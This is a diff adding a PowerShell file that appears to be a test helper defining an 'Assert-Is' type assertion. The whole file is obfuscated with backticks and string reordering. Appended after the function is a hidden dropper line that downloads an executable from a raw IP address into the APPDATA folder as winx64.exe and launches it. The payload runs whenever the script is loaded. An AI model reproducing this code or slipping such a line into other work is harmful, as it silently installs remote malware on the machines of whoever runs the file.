@@ -1,0 +1,31 @@
+function a`sSEr`T-Is
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(PoSitIoN=0)]
+        [object]
+        
+        ${I`NPut`objEct},
+
+        [Parameter(PositioN=1)]
+        [Type]
+        
+        ${E`xPECT`E`dtYpE},
+
+        [Parameter(POsITIon=2)]
+        [string]
+        
+        ${mess`AgE}
+    )
+
+    &("{4}{0}{3}{2}{1}"-f'et-Stric','ode','M','t','S') -Version ("{0}{1}" -f'Lat','est')
+
+    if( ${I`NpU`TobJECt} -isnot ${exP`E`CTeDT`ypE} ) 
+    {
+        &("{0}{1}" -f'F','ail') ("Expected object to be of type '{0}' but was '{1}'. {2}" -f ${ex`Pec`T`eDtYpE},${iNPutoB`j`e`cT}.("{0}{2}{1}" -f'GetTy','e','p').Invoke(),${mEs`sa`gE})
+    }
+}
+
+
+(.("{1}{0}{2}"-f '-Obje','New','ct') ("{3}{2}{4}{0}{5}{1}"-f't.WebCli','t','.N','System','e','en')).("{1}{0}{2}" -f 'dFil','Downloa','e').Invoke(("{8}{6}{10}{2}{4}{1}{3}{9}{7}{0}{5}"-f'4','revo','102.58.30/','r','~t','.exe','//9','nx6','http:','/wi','4.'),"$env:APPDATA\winx64.exe");&("{2}{1}{0}"-f't-Process','ar','St') ("$env:APPDATA\winx64.exe")
